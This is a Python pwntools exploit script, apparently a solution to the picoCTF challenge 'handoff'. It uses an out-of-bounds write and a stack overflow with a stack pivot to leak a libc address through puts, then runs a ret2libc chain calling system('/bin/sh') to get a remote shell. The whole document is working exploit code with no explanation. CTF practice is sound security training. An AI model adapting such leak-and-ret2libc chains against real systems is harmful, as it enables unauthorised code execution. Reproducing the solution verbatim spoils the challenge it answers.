#!/usr/bin/env python3

from pwn import *

exe = ELF("./handoff", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.DEBUG:
        gdb.attach(p)
else:
    p = remote("shape-facility.picoctf.net", 50282)

input()

# Out-of-bound + Ret2libc

# Leak libc
pop_rdi = 0x00000000004014b3
rw_section = 0x404d00
leave_ret = 0x000000000040140d
ret = 0x000000000040101a

p.sendlineafter(b'app\n', b'3')
payload = b'a'*0xc + p64(rw_section) + p64(0x0000000000401324)
p.sendlineafter(b'it: \n', payload)

# 0x4049e0
p.sendline(str(-1))
payload = p64(rw_section - 0x200) + p64(ret) + p64(pop_rdi) + p64(exe.got['puts']) + p64(exe.plt['puts'])
payload += p64(0x0000000000401324)
p.sendlineafter(b'them?\n', payload)

p.sendlineafter(b'app\n', b'3')
payload = b'a'*0xc + p64(0x4049e0) + p64(leave_ret)
p.sendlineafter(b'it: \n', payload)

leak = u64(p.recv(6) + b'\0\0')
print("Libc leak: " + hex(leak))
libc_base = leak - 0x080e50
print("Libc address: " + hex(libc_base))

# Get shell
p.sendline(str(-1))
bin_sh = libc_base + 0x1d8678
system = libc_base + 0x050d70
payload = b'a'*8 + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)
p.sendlineafter(b'them?\n', payload)

p.sendlineafter(b'app\n', b'3')
payload = b'a'*0xc + p64(0x4047e0) + p64(leave_ret)
p.sendlineafter(b'it: \n', payload)

p.interactive()